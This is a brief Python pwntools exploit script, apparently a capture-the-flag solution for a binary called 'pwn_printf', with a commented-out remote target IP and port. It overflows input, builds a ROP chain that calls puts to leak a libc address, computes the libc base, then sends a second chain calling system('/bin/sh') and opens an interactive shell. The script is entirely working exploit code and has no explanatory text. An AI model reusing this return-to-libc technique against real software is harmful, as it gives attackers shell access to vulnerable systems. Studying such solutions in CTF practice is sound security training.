from pwn import *
elf = ELF("./pwn_printf")
p = elf.process()
libc = ELF("./pwn_printf").libc
#p = remote("47.111.104.99",51006)
bss = elf.bss()
print hex(bss)
p.recvuntil("You will find this game very interesting\n")
for i in range(16):
	p.sendline(str(0x20))
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x0000000000401213
gdb.attach(p)
p.send(p64(0x603500)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x4007DF))
libc_base = u64(p.recv(6)+'\x00\x00') - libc.sym['puts']
info("libc_base:" + hex(libc_base))

p.sendline("a"*0x8+p64(pop_rdi)+p64(libc_base+libc.search("/bin/sh").next())+p64(libc_base+libc.sym['system']))
p.interactive()
